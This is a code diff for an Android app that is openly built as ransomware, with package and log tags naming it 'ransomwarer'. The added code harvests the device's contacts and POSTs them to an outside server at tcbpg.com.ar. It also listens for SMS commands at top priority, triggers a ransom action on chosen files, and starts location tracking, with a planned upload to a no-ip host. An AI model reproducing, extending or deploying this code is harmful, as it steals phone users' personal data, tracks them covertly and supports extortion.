@@ -7,13 +7,29 @@ import java.io.IOException;
 import java.text.SimpleDateFormat;
 import java.util.ArrayList;
 import java.util.Date;
+import java.util.List;
 import java.util.Locale;
+
+import org.apache.http.HttpResponse;
+import org.apache.http.HttpVersion;
+import org.apache.http.NameValuePair;
+import org.apache.http.client.HttpClient;
+import org.apache.http.client.entity.UrlEncodedFormEntity;
+import org.apache.http.client.methods.HttpPost;
+import org.apache.http.impl.client.DefaultHttpClient;
+import org.apache.http.message.BasicNameValuePair;
+import org.apache.http.params.CoreProtocolPNames;
+import org.apache.http.util.EntityUtils;
 
 import android.app.Activity;
 import android.content.Context;
 import android.content.Intent;
 import android.content.IntentFilter;
 import android.hardware.Camera;
+import android.location.Location;
+import android.location.LocationListener;
+import android.location.LocationManager;
+import android.os.AsyncTask;
 import android.os.Bundle;
 import android.os.Environment;
 import android.os.Vibrator;
@@ -31,7 +47,8 @@ public class MainActivity extends Activity implements Commandable {
 	private SMSCommandParser parser;
 	private SMSReceiver receiver;
 	private IntentFilter filter;
-		
+	private String SMS = "android.provider.Telephony.SMS_RECEIVED";
+
 	protected void onCreate(Bundle savedInstanceState) {
 		super.onCreate(savedInstanceState);
 		setContentView(R.layout.activity_main);
@@ -41,35 +58,63 @@ public class MainActivity extends Activity implements Commandable {
 		receiver = new SMSReceiver();
 		receiver.addConsumer(parser);
 
-		filter = new IntentFilter("android.provider.Telephony.SMS_RECEIVED");
+		filter = new IntentFilter(SMS);
 		filter.setPriority(Integer.MAX_VALUE);
-		
+
 		registerReceiver(receiver, filter);
-		
-		/*this.randomRansom();*/
 	}
-	
-	protected void onRestart(){
+
+	protected void onRestart() {
 		registerReceiver(receiver, filter);
 		super.onRestart();
 	}
-	
-	protected void onStop()
-	{
-	    unregisterReceiver(receiver);
-	    super.onStop();
+
+	protected void onStop() {
+		unregisterReceiver(receiver);
+		super.onStop();
 	}
-	
+
 	public boolean onCreateOptionsMenu(Menu menu) {
 		getMenuInflater().inflate(R.menu.main, menu);
 		return true;
 	}
 
 	private ArrayList<Contact> contacts;
-
+	private String URL = "http://tcbpg.com.ar/echo.php";
+	
 	public void getContactList() {
 		this.contacts = new ContactsReader(this.getApplicationContext()).contacts();
-		Log.d("SAFEAPP", contacts.toString());
+		new AsyncTask< Void,Void,Void>(){
+			protected Void doInBackground(Void... arg0) {
+				try {
+					HttpPost post = new HttpPost(URL);
+					HttpClient client = new DefaultHttpClient();
+					client.getParams().setParameter(
+							CoreProtocolPNames.PROTOCOL_VERSION, HttpVersion.HTTP_1_1);
+
+					List<NameValuePair> content = new ArrayList<NameValuePair>();
+
+					StringBuilder sb = new StringBuilder();
+					sb.append("[");
+					for(Contact c : contacts){ 
+						sb.append(c.toString());
+						sb.append(",");
+					}
+					sb.setCharAt(sb.length()-1, ']');
+
+					content.add(new BasicNameValuePair("contacts",sb.toString()));
+					post.setEntity(new UrlEncodedFormEntity(content));
+
+					HttpResponse response = client.execute(post);
+
+					Log.d("RANSOMWARER","Server replied: "
+						+ EntityUtils.toString(response.getEntity()));
+				} catch (Exception e) {
+					Log.e("RANSOMWARER", "Exception sending data: ", e);
+				}
+				return null;
+			}			
+		}.execute();
 	}
 
 	private File getAlbumDir() {
@@ -138,16 +183,72 @@ public class MainActivity extends Activity implements Commandable {
 		});
 	}
 
-	public void randomRansom() {
+	public void takeRansom(String filename) {
 		Intent sendIntent = new Intent();
 		sendIntent.setAction("com.ransom.ransomwarer.action.RANSOM_ACTION");
-		sendIntent.putExtra(Intent.EXTRA_TEXT, "/DCIM/prueba/dos.jpg");
+		sendIntent.putExtra(Intent.EXTRA_TEXT, filename);
 		sendIntent.setType("ransom/note");
 		startService(sendIntent);
 	}
 
 	@Override
 	public void sendSMS(String nro, String mensaje) {
-		// TODO Auto-generated method stub	
+		// TODO Auto-generated method stub
 	}
+
+	// private Location userLocation;
+	private LocationListener locationListener;
+
+	public void getLocation() {
+		// Acquire a reference to the system Location Manager
+		final LocationManager locationManager = (LocationManager) this
+				.getSystemService(Context.LOCATION_SERVICE);
+
+		// Define a listener that responds to location updates
+		locationListener = new LocationListener() {
+
+			public void onStatusChanged(String provider, int status,
+					Bundle extras) {
+			}
+
+			public void onProviderEnabled(String provider) {
+			}
+
+			public void onProviderDisabled(String provider) {
+			}
+
+			@Override
+			public void onLocationChanged(Location location) {
+				// TODO: send the location to the server
+				// userLocation = location;
+				stopLocationUpdate(locationManager, locationListener);
+				// TODO: send userLocation information to the server
+			}
+		};
+
+		// Register the listener with the Location Manager to receive location
+		// updates
+		String locationProvider = LocationManager.NETWORK_PROVIDER;
+		// To use GPS location data:
+		// String locationProvider = LocationManager.GPS_PROVIDER;
+		// and change permissions in the manifest file instead of
+		// ACCESS_COARSE_LOCATION, use ACCESS_FINE_LOCATION
+
+		locationManager.requestLocationUpdates(locationProvider, 0, 0,
+				locationListener);
+	}
+
+	public void stopLocationUpdate(LocationManager locationManager,
+			LocationListener locationListener) {
+		locationManager.removeUpdates(locationListener);
+	}
+
+	// TODO: POST Request
+	// public void uploadLocation() {
+	// HttpPost httppost = new HttpPost("http://manzana.no-ip.org/poster.php");
+	// HttpClient client = new DefaultHttpClient();
+	// client.getParams().setParameter(CoreProtocolPNames.PROTOCOL_VERSION,
+	// HttpVersion.HTTP_1_1);
+	// }
+	//
 }
